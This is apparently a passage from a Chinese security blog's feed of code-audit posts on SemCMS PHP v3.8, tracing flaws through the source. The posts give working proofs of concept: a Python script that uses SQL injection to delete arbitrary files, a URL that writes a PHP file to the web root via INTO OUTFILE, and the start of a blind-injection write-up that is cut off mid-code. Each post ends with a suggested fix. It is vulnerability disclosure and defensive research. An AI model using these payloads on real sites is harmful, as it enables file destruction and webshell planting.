    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>此篇为审计semcms_php_v3.8的第五篇文章</p><p>SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。<br>SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。<br>官网: <a href="http://www.sem-cms.com" target="_blank" rel="noopener">http://www.sem-cms.com/</a><br>审计版本为最新php版 v3.8<br><img src="https://i.loli.net/2019/03/14/5c89d09c2c001.png" alt></p><h2 id="0x01-任意文件删除"><a href="#0x01-任意文件删除" class="headerlink" title="0x01 任意文件删除"></a>0x01 任意文件删除</h2><p>首先在后台<code>Include/function.php</code>功能函数文件中，有一个执行文件删除的函数<code>Delfile()</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//删除指定文件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Delfile</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">    unlink($filename);</span><br><span class="line">    &#125;</span><br><span class="line">   $filename=str_replace(<span class="string">"prdoucts/"</span>, <span class="string">"prdoucts/small/"</span>, $filename);</span><br><span class="line">  <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">    unlink($filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><p>全局搜索查看在哪里调用了该函数。发现在<code>SEMCMS_Function.php</code>中有多次调用<br><img src="https://i.loli.net/2019/03/16/5c8cbc75c111b.png" alt><br>这里随便跟踪一个，进入到<code>SEMCMS_Function.php</code>第921行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="variable">$db_conn</span>-&gt;query(<span class="string">"select * from sc_images WHERE ID in (<span class="variable">$area_arr</span>)"</span>);</span><br><span class="line">                    <span class="keyword">while</span>(<span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$query</span>))&#123;</span><br><span class="line">                         Delfile(<span class="variable">$row</span>[<span class="string">'images_url'</span>]);</span><br><span class="line">                       &#125;</span><br></pre></td></tr></table></figure></p><p>可以发现应该是一个图片删除操作，图片目录保存在数据表<code>sc_images</code>中。到数据库中查看可以验证这一点<br><img src="https://i.loli.net/2019/03/16/5c8cbd2c1d826.png" alt></p><p>那么此时便可以看看<code>$area_arr</code>变量是否可控，从而改变sql查询的结果，达到任意文件删除。继续向上跟踪<code>area_arr</code>变量。<br><img src="https://i.loli.net/2019/03/16/5c8cbdf0f1584.png" alt><br>在该文件开头可以看到定义了<code>area_arr</code>数组，并且是由<code>POST</code>方式传递进来的<code>AID</code>得到的。<br>这里小伙伴们又要开始惊喜了，因为前面的分析分章不只出现这一处问题了,我们知道后台所有页面均包含了<code>contorl.php</code>对<code>GET</code>传来的数据进行了清洗。而这里偏偏却用了POST方式来接收数据，继续跟踪改变量后，发现到拼接进sql语句再到进入文件删除函数过程中未进行其他任何过滤。</p><p><code>SEMCMS_Function.php 919行</code><br><img src="https://i.loli.net/2019/03/16/5c8cb6d02d441.png" alt><br>后台<code>Include/function.php</code><br><img src="https://i.loli.net/2019/03/16/5c8cb72c99346.png" alt></p><p>如上图显示，网站根目录下<code>boogle.php</code>已被成功删除。</p><h2 id="0x02-poc"><a href="#0x02-poc" class="headerlink" title="0x02 poc"></a>0x02 poc</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="comment">#[+]Author : boogle</span></span><br><span class="line"><span class="comment">#[+]Blog :https://boogle.github.io/</span></span><br><span class="line"></span><br><span class="line">delete_file = <span class="string">"'../test.php'"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"-1) union select 1,"</span>+delete_file+<span class="string">",3,4,5-- -"</span></span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">"http://127.0.0.1:80/semcms_php_v3.8/9GJQNH_Admin/SEMCMS_Images.php?Class=Deleted&amp;CF=Images"</span></span><br><span class="line"></span><br><span class="line">burp0_headers = &#123;<span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span>, <span class="string">"Origin"</span>: <span class="string">"http://127.0.0.1"</span>, <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>, <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>, <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36"</span>, <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"</span>, <span class="string">"Referer"</span>: <span class="string">"http://127.0.0.1/semcms_php_v3.8/9GJQNH_Admin/SEMCMS_Images.php"</span>, <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>&#125;</span><br><span class="line">burp0_data=&#123;<span class="string">"AID[]"</span>: payload&#125;</span><br><span class="line"></span><br><span class="line">requests.post(burp0_url, headers=burp0_headers,  data=burp0_data)</span><br><span class="line"></span><br><span class="line">print <span class="string">"[+]delete Success!"</span></span><br></pre></td></tr></table></figure><h2 id="0x03-修复方法"><a href="#0x03-修复方法" class="headerlink" title="0x03 修复方法"></a>0x03 修复方法</h2><p>在<code>contorl.php</code>中增加对POST的过滤。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST))&#123;$PostArray=$_POST;&#125;<span class="keyword">else</span>&#123;$PostArray=<span class="string">''</span>;&#125; <span class="comment">//post</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">foreach</span> ($PostArray <span class="keyword">as</span> $value)&#123; <span class="comment">//post</span></span><br><span class="line">    </span><br><span class="line">    verify_str($value);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;此篇为审计semcms_php_v3.8的第五篇文章&lt;/p&gt;
&lt;p&gt;SemCms是一套开源外贸企业网
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="https://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="0day挖掘" scheme="https://zhengbao.wang/tags/0day%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>semcms_php_v3.8 后台注入getshell</title>
    <link href="https://zhengbao.wang/semcms-php-v3-8-%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5getshell/"/>
    <id>https://zhengbao.wang/semcms-php-v3-8-后台注入getshell/</id>
    <published>2019-03-16T03:20:02.000Z</published>
    <updated>2019-03-25T00:35:12.279Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>此篇为审计semcms_php_v3.8的第四篇文章</p><p>SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。<br>SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。<br>官网:<a href="http://www.sem-cms.com" target="_blank" rel="noopener">http://www.sem-cms.com/</a><br>审计版本为最新php版 v3.8<br><img src="https://i.loli.net/2019/03/14/5c89d09c2c001.png" alt></p><h2 id="0x01-后台sql注入绕过过滤函数写文件"><a href="#0x01-后台sql注入绕过过滤函数写文件" class="headerlink" title="0x01 后台sql注入绕过过滤函数写文件"></a>0x01 后台sql注入绕过过滤函数写文件</h2><p>前面三篇审计文章中，注入过程中均受到了<code>inject_check_sql()</code>过滤函数的影响，导致<code>select`</code>outfile`等无法使用。而且通过前面的审计，我们已有两种方法进入后台，此次继续向后台进发。<br><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function inject_check_sql($sql_str) &#123;</span><br><span class="line">     return preg_match('/select|<span class="string">insert</span>|<span class="string">=</span>|<span class="string">%</span>|<span class="string">&lt;</span>|<span class="string">between</span>|<span class="string">update</span>|<span class="string">\'</span>|<span class="string">\*</span>|<span class="string">union</span>|<span class="string">into</span>|<span class="string">load_file</span>|<span class="string">outfile/i',$sql_str);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure></p><p>本次后台的注入点将绕过该过滤函数，执行更多的操作，运气好的话，更会直接getshell。<br>下面开始审计过程<br>漏洞触发点在后台<code>SEMCMS_Products.php</code><br>在18行<br><img src="https://i.loli.net/2019/03/16/5c8c67651ca1b.png" alt><br>这里接受searchml竟然使用了<code>REQUEST</code>方式，因为前面都包含了<code>control.php</code>，在该函数中均GET得到的数据进行了清洗<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 防sql入注</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET))&#123;$GetArray=$_GET;&#125;<span class="keyword">else</span>&#123;$GetArray=<span class="string">''</span>;&#125; <span class="comment">//get</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">foreach</span> ($GetArray <span class="keyword">as</span> $value)&#123; <span class="comment">//get</span></span><br><span class="line">    </span><br><span class="line">    verify_str($value);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>而此次使用了<code>REQUEST</code>来获取数据，如入无人之地，继续跟踪该变量<code>CatID</code>的走向<br>还是在该文件的132，可以看到<code>CatID</code>变量进入了<code>prolmid</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($CatID!=<span class="string">""</span> &amp;&amp; $Searchp!=<span class="string">""</span>)&#123;</span><br><span class="line"></span><br><span class="line">     $flID=prolmid($CatID,$db_conn);</span><br><span class="line">     $sql=$db_conn-&gt;query(<span class="string">"select * from sc_products where languageID="</span>.$_GET[<span class="string">"lgid"</span>].<span class="string">" and products_name like '%"</span>.$Searchp.<span class="string">"%' and $flID"</span>); </span><br><span class="line"></span><br><span class="line">   &#125;<span class="keyword">elseif</span>($CatID!=<span class="string">""</span> &amp;&amp; $Searchp==<span class="string">""</span>)&#123;</span><br><span class="line"></span><br><span class="line">     $flID=prolmid($CatID,$db_conn);</span><br><span class="line">     $sql=$db_conn-&gt;query(<span class="string">"select * from sc_products where languageID="</span>.$_GET[<span class="string">"lgid"</span>].<span class="string">" and $flID"</span>);     </span><br><span class="line"></span><br><span class="line">   &#125;<span class="keyword">elseif</span>($CatID==<span class="string">""</span> &amp;&amp; $Searchp!=<span class="string">""</span>)&#123;</span><br><span class="line">     </span><br><span class="line">     $sql=$db_conn-&gt;query(<span class="string">"select * from sc_products where languageID="</span>.$_GET[<span class="string">"lgid"</span>].<span class="string">" and products_name like '%"</span>.$Searchp.<span class="string">"%'"</span>);     </span><br><span class="line"></span><br><span class="line">   &#125;<span class="keyword">elseif</span>($indextjs==<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">     $sql=$db_conn-&gt;query(<span class="string">"select * from sc_products where languageID="</span>.$_GET[<span class="string">"lgid"</span>].<span class="string">" and products_index=1 "</span>);   </span><br><span class="line"></span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    $sql=$db_conn-&gt;query(<span class="string">"select * from sc_products where languageID="</span>.$_GET[<span class="string">"lgid"</span>].<span class="string">""</span>);  </span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>跟进<code>prolmid</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prolmid</span><span class="params">($ID,$db_conn)</span></span>&#123;  </span><br><span class="line"></span><br><span class="line">    $str=<span class="string">""</span>;</span><br><span class="line">    $strs=<span class="string">""</span>; </span><br><span class="line">    $query=$db_conn-&gt;query(<span class="string">"select ID from sc_categories where LOCATE(',"</span>.$ID.<span class="string">",', category_path)&gt;0 and category_open=1"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>($row=mysqli_fetch_array($query))&#123;</span><br><span class="line">        </span><br><span class="line">      $str.= <span class="string">"LOCATE(',"</span>.$row[<span class="string">'ID'</span>].<span class="string">",', products_category)&gt;0 or "</span>;</span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line">      $strs =<span class="string">"("</span>.rtrim($str,<span class="string">"or "</span>).<span class="string">")"</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> $strs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到未经任何过滤直接拼接带入了sql语句。</p><h2 id="0x02-poc"><a href="#0x02-poc" class="headerlink" title="0x02 poc"></a>0x02 poc</h2><p>直接构造一个写webshell的payload<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://127.0.0.1/semcms_php_v3.8/9GJQNH_Admin/SEMCMS_Products.php?searchml=1<span class="number">%27</span>,<span class="number">%20</span>category_path)<span class="number">%3</span>E0<span class="number">%20</span>and<span class="number">%20</span>category_open=1<span class="number">%20</span>union<span class="number">%20</span>select<span class="number">%20</span><span class="number">%22</span><span class="number">%3</span>C?php<span class="number">%20</span>phpinfo();?<span class="number">%3</span>E<span class="number">%22</span><span class="number">%20</span>into<span class="number">%20</span>outfile<span class="number">%20</span><span class="number">%22</span>F:\\phpstudy\\PHPTutorial\\WWW\\semcms_php_v3.8\\boogle.php<span class="number">%22</span>--<span class="number">%20</span>-</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/16/5c8c6a84d3557.png" alt></p><p>访问<code>http://127.0.0.1/semcms_php_v3.8/boogle.php</code>,看到写入成功</p><p><img src="https://i.loli.net/2019/03/16/5c8c6ac6bcac3.png" alt></p><h2 id="0x03-修复方法"><a href="#0x03-修复方法" class="headerlink" title="0x03 修复方法"></a>0x03 修复方法</h2><p>将<code>REQUEST</code>改为<code>GET</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;此篇为审计semcms_php_v3.8的第四篇文章&lt;/p&gt;
&lt;p&gt;SemCms是一套开源外贸企业网
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="https://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="0day挖掘" scheme="https://zhengbao.wang/tags/0day%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>semcms_php_v3.8 时间盲注</title>
    <link href="https://zhengbao.wang/semcms-php-v3-8-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
    <id>https://zhengbao.wang/semcms-php-v3-8-时间盲注/</id>
    <published>2019-03-15T13:23:02.000Z</published>
    <updated>2019-03-25T00:35:03.440Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>此篇为审计semcms_php_v3.8的第三篇文章</p><p>SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。<br>SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。<br>官网:<a href="http://www.sem-cms.com" target="_blank" rel="noopener">http://www.sem-cms.com/</a><br>审计版本为最新php版 v3.8<br><img src="https://i.loli.net/2019/03/14/5c89d09c2c001.png" alt></p><h2 id="0x01-web-check-php时间盲注得后台账号密码"><a href="#0x01-web-check-php时间盲注得后台账号密码" class="headerlink" title="0x01 web_check.php时间盲注得后台账号密码"></a>0x01 web_check.php时间盲注得后台账号密码</h2><p>首先查看后台登陆页面,忘记密码处<br><img src="https://i.loli.net/2019/03/15/5c8b1da3d28e6.png" alt><br>后台<code>index.html</code>代码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;<span class="name">li</span> <span class="attr">style</span>=<span class="string">"text-align:right; margin-right:10px; float:right;"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:views();"</span>&gt;</span>如果忘记账号与密码,试试找回?<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"image"</span> <span class="attr">style</span>=<span class="string">"width:70px; height:28px; border:0px;"</span> <span class="attr">src</span>=<span class="string">"SC_Page_Config/Image/SEMCMS_Longin.jpg"</span> /&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">views</span><span class="params">()</span></span>&#123;TINY.box.show(<span class="string">'SEMCMS_Remail.php?type=find'</span>,<span class="number">1</span>,<span class="number">500</span>,<span class="number">130</span>,<span class="number">1</span>)&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">if</span> (Request(<span class="string">"type"</span>)==<span class="string">"ok"</span>)&#123;</span></span><br><span class="line"><span class="actionscript"> <span class="keyword">var</span> umail=Request(<span class="string">"umail"</span>) ; </span></span><br><span class="line"><span class="actionscript">TINY.box.show(<span class="string">'SEMCMS_Remail.php?type=ok&amp;umail='</span>+umail,<span class="number">1</span>,<span class="number">500</span>,<span class="number">230</span>,<span class="number">1</span>)    </span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">Request</span><span class="params">(strName)</span></span></span></span><br><span class="line"><span class="undefined">&#123;</span></span><br><span class="line"><span class="javascript">thisURL = <span class="built_in">decodeURIComponent</span>(<span class="built_in">document</span>.URL);</span></span><br><span class="line"><span class="undefined">strwrite = thisURL</span></span><br><span class="line"><span class="actionscript"><span class="comment">//document.write(strwrite);</span></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> strHref =strwrite;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> intPos = strHref.indexOf(<span class="string">"?"</span>);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> strRight = strHref.substr(intPos + <span class="number">1</span>);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> arrTmp = strRight.split(<span class="string">"&amp;"</span>);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrTmp.length; i++)</span></span><br><span class="line"><span class="undefined">&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> arrTemp = arrTmp[i ].split(<span class="string">"="</span>);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">if</span>(arrTemp[<span class="number">0</span>].toUpperCase() == strName.toUpperCase()) <span class="keyword">return</span> arrTemp[<span class="number">1</span>];</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">return</span> <span class="string">""</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>可以当点击忘记密码时，会调用js的<code>views()</code>函数，而该，函数请求了<code>SEMCMS_Remail.php</code>。<br>跟进<code>SEMCMS_Remail.php</code>查看,发现又调用了<code>../Include/web_check.php</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"form"</span> <span class="attr">action</span>=<span class="string">"../Include/web_check.php?type=fintpassword"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">width</span>=<span class="string">"500"</span> <span class="attr">cellpadding</span>=<span class="string">"0"</span> <span class="attr">cellspacing</span>=<span class="string">"0"</span> <span class="attr">class</span>=<span class="string">"table"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">"2"</span> <span class="attr">align</span>=<span class="string">"right"</span> <span class="attr">class</span>=<span class="string">"tdsbg"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">" float:left;"</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>找回账号密码!<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:TINY.box.hide()"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"SC_Page_Config/Image/icons/hr.gif"</span> <span class="attr">border</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">"20%"</span> <span class="attr">align</span>=<span class="string">"right"</span> <span class="attr">valign</span>=<span class="string">"middle"</span>&gt;</span>输入E-mail:<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"left"</span> <span class="attr">valign</span>=<span class="string">"middle"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"Email"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"Email"</span> <span class="attr">size</span>=<span class="string">"50"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span> <span class="attr">valign</span>=<span class="string">"middle"</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span> <span class="attr">valign</span>=<span class="string">"middle"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"furl"</span> <span class="attr">id</span>=<span class="string">"furl"</span> <span class="attr">value</span>=<span class="string">"&lt;?php echo $url =  "</span><span class="attr">http:</span>//"<span class="attr">.</span>$<span class="attr">_SERVER</span> ['<span class="attr">HTTP_HOST</span>']<span class="attr">.</span>$<span class="attr">_SERVER</span>['<span class="attr">PHP_SELF</span>'];  ?&gt;</span>" &gt; <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"确认找回!"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>再次跟进<code>../Include/web_check.php</code><br>发现可以通过直接访问该页面，传入相应的操作进行请求,而无需从后台登陆处忘记密码进入。<br>当GET传入的type为<code>findok</code>时，进入如下分支<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($Type==<span class="string">"findok"</span>)&#123; <span class="comment">//  密码找回  </span></span><br><span class="line"> </span><br><span class="line">     $umail=test_input(verify_str($_POST[<span class="string">'Email'</span>]));</span><br><span class="line">     $umm=test_input(verify_str($_POST[<span class="string">'umima'</span>]));</span><br><span class="line">     $urzm=test_input(verify_str($_POST[<span class="string">'uyzm'</span>]));</span><br><span class="line">     $fhurl=str_replace(<span class="string">"SEMCMS_Remail.php"</span>,<span class="string">""</span>,$_POST[<span class="string">'furl'</span>]);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span>(<span 